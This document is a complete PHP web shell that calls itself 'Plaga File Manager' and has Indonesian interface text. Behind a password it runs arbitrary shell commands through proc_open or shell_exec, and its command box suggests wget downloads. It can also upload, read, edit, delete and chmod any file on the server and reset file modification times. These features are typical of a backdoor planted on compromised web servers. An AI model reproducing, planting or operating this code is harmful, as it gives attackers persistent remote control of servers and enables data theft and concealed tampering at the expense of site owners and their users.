<?php
ini_set('session.gc_maxlifetime', 86400);
session_set_cookie_params(86400);

session_start();

$hashed_password = '$2b$12$tpumex1eLs.8Jr44/UH2geFuQBPddqW8PA.zaPkB7RgjPhnldk036';

if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: ?");
    exit;
}

if (!isset($_SESSION['plaga_auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['plaga_auth'] = true;
            header("Location: ?");
            exit;
        }
        die("Password salah bego");
    }
    ?>
    <form method="post">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
    <?php
    exit;
}

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");

$path = isset($_REQUEST['path']) ? realpath($_REQUEST['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$edit = isset($_GET['edit']) ? realpath($_GET['edit']) : null;

function runCommand($cmd, $cwd) {
    $disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
    if (!in_array('proc_open', $disabled) && !in_array('proc_close', $disabled)) {
        $des = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $proc = proc_open(['/bin/bash','-lc',$cmd], $des, $pipes, $cwd);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            $out = stream_get_contents($pipes[1]);
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($proc);
            return $out.$err;
        }
        return "Command execution failed.";
    }
    if (!in_array('shell_exec', $disabled)) {
        return shell_exec('cd '.escapeshellarg($cwd).' && bash -lc '.escapeshellarg($cmd).' 2>&1');
    }
    return "Command execution is disabled.";
}

if ($edit && is_file($edit)) {
    echo file_get_contents($edit);
    exit;
}

$output = '';
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    $output = runCommand($command, $path);
}

if (isset($_POST['rename']) && isset($_POST['old']) && isset($_POST['new'])) { @rename($_POST['old'], dirname($_POST['old']).'/'.$_POST['new']); exit; }
if (isset($_POST['chmod']) && isset($_POST['file']) && isset($_POST['perm'])) { @chmod($_POST['file'], octdec($_POST['perm'])); exit; }
if (isset($_POST['modtime']) && isset($_POST['file']) && isset($_POST['time'])) { @touch($_POST['file'], strtotime($_POST['time'])); exit; }
if (isset($_POST['save']) && isset($_POST['file'])) { file_put_contents($_POST['file'], $_POST['content']); header("Location: ?path=".urlencode(dirname($_POST['file']))); exit; }
if (isset($_POST['delete']) && isset($_POST['file'])) { $t=$_POST['file']; if (is_dir($t)) {@rmdir($t);} else {@unlink($t);} exit; }
if (isset($_POST['newfile']) && isset($_POST['newfilename'])) { $nf=$path.'/'.basename($_POST['newfilename']); file_put_contents($nf,''); header("Location: ?path=".urlencode($path)); exit; }
if (isset($_FILES['uploadfile'])) { $tp=$path.'/'.basename($_FILES['uploadfile']['name']); move_uploaded_file($_FILES['uploadfile']['tmp_name'],$tp); header("Location: ?path=".urlencode($path)); exit; }

$items = scandir($path);
$folders = $files = [];
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $full = $path.DIRECTORY_SEPARATOR.$item;
    if (is_dir($full)) $folders[$item]=$item; else $files[$item]=$item;
}
ksort($folders); ksort($files);

function perms($file){ return substr(sprintf('%o', @fileperms($file)), -4); }
function h($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function icon_folder(){
    return '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#d63384"><path d="M10.414 4H4a2 2 0 0 0-2 2v2h20V8a2 2 0 0 0-2-2h-7.586l-1.707-1.707A1 1 0 0 0 10.414 4z"/><path d="M22 10H2v8a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-8z"/></svg>';
}
function icon_file(){
    return '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#ff66a3"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg>';
}
function icon_trash(){
    return '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="#d63384"><path d="M9 3h6l1 2h4v2H4V5h4l1-2z"/><path d="M6 9h12l-1 11a2 2 0 0 1-2 2H9a2 2 0 0 1-2-2L6 9z"/></svg>';
}
function icon_edit(){
    return '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="#d63384"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25z"/><path d="M20.71 7.04a1 1 0 0 0 0-1.41l-2.34-2.34a1 1 0 0 0-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>';
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Plaga File Manager</title>
  <style>
    :root{--pink:#d63384;--pink-2:#ff66a3;--bg:#ffe6f0;--line:#f5a3c7;--hover:#fcd9e5;}
    *{box-sizing:border-box}
    body{font-family:Arial,Helvetica,sans-serif;background:var(--bg);color:#333;padding:20px}
    h1{color:var(--pink);margin:0 0 10px}
    .topbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
    .path{font-size:12px;color:#a12462}
    form.inline{display:inline;margin-right:10px}
    input[name="cmd"]{width:360px}
    table{width:100%;border-collapse:collapse;margin-top:10px;background:#fff0f5;border-radius:12px;overflow:hidden}
    th,td{padding:10px;border:1px solid var(--line);vertical-align:middle}
    tr:hover{background:var(--hover)}
    .namecell a{color:inherit;text-decoration:none;display:inline-flex;gap:8px;align-items:center}
    .namecell svg{vertical-align:middle;flex:none}
    .folder{font-weight:bold}
    .btn{border:0;background:#ffd1e1;padding:6px 10px;border-radius:8px;cursor:pointer;display:inline-flex;align-items:center;gap:6px}
    .btn:hover{filter:brightness(0.97)}
    .breadcrumb{margin-top:10px}
    .breadcrumb a{text-decoration:none;color:var(--pink);margin-right:5px}
    .breadcrumb a:hover{text-decoration:underline}
    .modal,.overlay{display:none;position:fixed;z-index:1000}
    .modal{top:10%;left:20%;width:60%;background:#fff0f5;padding:20px;border:2px solid var(--pink);border-radius:14px}
    .overlay{top:0;left:0;width:100%;height:100%;background:rgba(255,192,203,.4);z-index:500}
    .modal textarea{width:100%;height:400px;font-family:monospace;background:#fff8fb;border:1px solid var(--line);border-radius:8px;padding:10px}
    td[contenteditable], span[contenteditable]{background:#fff8fb;cursor:text}
    .actions{white-space:nowrap;display:flex;gap:8px}
    .sizecol,.permcol,.modcol{font-family:ui-monospace,Menlo,Consolas,monospace}
  </style>
  <script>
    function editFile(path){
      fetch('?edit='+encodeURIComponent(path))
        .then(res=>res.text())
        .then(text=>{
          document.getElementById('editor-area').value=text;
          document.getElementById('editor-path').value=path;
          document.getElementById('editor-filename').textContent=path.split('/').pop();
          document.getElementById('editor-modal').style.display='block';
          document.getElementById('overlay').style.display='block';
        });
    }
    function closeModal(){
      document.getElementById('editor-modal').style.display='none';
      document.getElementById('overlay').style.display='none';
    }
    function makeEditable(cell,type,path){
      const span=cell.querySelector('span');
      span.contentEditable=true; span.focus();
      span.addEventListener('blur',()=>{
        const value=span.textContent.trim();
        const fd=new FormData();
        if(type==='name'){ fd.append('rename',1); fd.append('old',path); fd.append('new',value); }
        else if(type==='chmod'){ fd.append('chmod',1); fd.append('file',path); fd.append('perm',value); }
        else if(type==='mod'){ fd.append('modtime',1); fd.append('file',path); fd.append('time',value); }
        fetch('',{method:'POST',body:fd}).then(()=>location.reload());
      },{once:true});
    }
    function deleteFile(path){
      if(confirm('Yakin mau hapus?')){
        const fd=new FormData();
        fd.append('delete',1); fd.append('file',path);
        fetch('',{method:'POST',body:fd}).then(()=>location.reload());
      }
    }
  </script>
</head>
<body>
  <div class="topbar">
    <h1>Plaga</h1>
    <div class="path">Dir aktif: <?= h($path) ?></div>
  </div>

  <form method="get">
    <input name="cmd" placeholder="Perintah shell (contoh: wget https://...)" autocomplete="off">
    <input type="hidden" name="path" value="<?= h($path) ?>">
    <input type="submit" value="Run" class="btn">
  </form>
  <pre><?= h($output) ?></pre>

  <form method="post" class="inline">
    <input name="newfilename" placeholder="New file name">
    <button type="submit" name="newfile" class="btn"><?= icon_file() ?> File</button>
    <input type="hidden" name="path" value="<?= h($path) ?>">
  </form>
  <form method="post" enctype="multipart/form-data" class="inline">
    <input type="file" name="uploadfile">
    <button type="submit" class="btn">? Upload</button>
    <input type="hidden" name="path" value="<?= h($path) ?>">
  </form>

  <div class="breadcrumb">
  <?php
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $built = '';
    foreach ($parts as $i=>$part) {
      if ($part === '' || ($i === 0 && DIRECTORY_SEPARATOR === '\\')) continue;
      $built .= DIRECTORY_SEPARATOR.$part;
      $real = realpath($built);
      if ($real) echo "<a href='?path=".urlencode($real)."'>".h($part)."</a> / ";
    }
  ?>
  </div>

  <table>
    <tr>
      <th>Name</th>
      <th class="sizecol">Size</th>
      <th class="modcol">Modified</th>
      <th class="permcol">Permissions</th>
      <th>Action</th>
    </tr>
    <?php foreach ($folders as $item): $real = $path.DIRECTORY_SEPARATOR.$item; ?>
      <tr>
        <td class="namecell folder" ondblclick="makeEditable(this,'name','<?= h($real) ?>')">
          <a href='?path=<?= h(realpath($real)) ?>'><?= icon_folder() ?> <span><?= h($item) ?></span></a>
        </td>
        <td class="sizecol">-</td>
        <td class="modcol" ondblclick="makeEditable(this,'mod','<?= h($real) ?>')"><span><?= date("d-m-Y H:i:s", @filemtime($real)) ?></span></td>
        <td class="permcol" ondblclick="makeEditable(this,'chmod','<?= h($real) ?>')"><span><?= h(perms($real)) ?></span></td>
        <td class="actions">
          <button class="btn" onclick="deleteFile('<?= h($real) ?>')"><?= icon_trash() ?> Delete</button>
        </td>
      </tr>
    <?php endforeach; ?>
    <?php foreach ($files as $item): $real = $path.DIRECTORY_SEPARATOR.$item; ?>
      <tr>
        <td class="namecell" ondblclick="makeEditable(this,'name','<?= h($real) ?>')">
          <?= icon_file() ?> <span><?= h($item) ?></span>
        </td>
        <td class="sizecol"><?= h(number_format((@filesize($real)?:0)/1024,2)) ?> KB</td>
        <td class="modcol" ondblclick="makeEditable(this,'mod','<?= h($real) ?>')"><span><?= date("d-m-Y H:i:s", @filemtime($real)) ?></span></td>
        <td class="permcol" ondblclick="makeEditable(this,'chmod','<?= h($real) ?>')"><span><?= h(perms($real)) ?></span></td>
        <td class="actions">
          <button class="btn" onclick="editFile('<?= h($real) ?>')"><?= icon_edit() ?> Edit</button>
          <button class="btn" onclick="deleteFile('<?= h($real) ?>')"><?= icon_trash() ?> Delete</button>
        </td>
      </tr>
    <?php endforeach; ?>
  </table>

  <div class="overlay" id="overlay" onclick="closeModal()"></div>
  <div class="modal" id="editor-modal">
    <h2>Edit File: <span id="editor-filename" style="font-weight:normal;"></span></h2>
    <form method="post">
      <textarea name="content" id="editor-area"></textarea>
      <input type="hidden" name="file" id="editor-path">
      <br><br>
      <button type="submit" name="save" class="btn">?? Save</button>
      <button type="button" class="btn" onclick="closeModal()">? Cancel</button>
      <input type="hidden" name="path" value="<?= h($path) ?>">
    </form>
  </div>
</body>
</html>
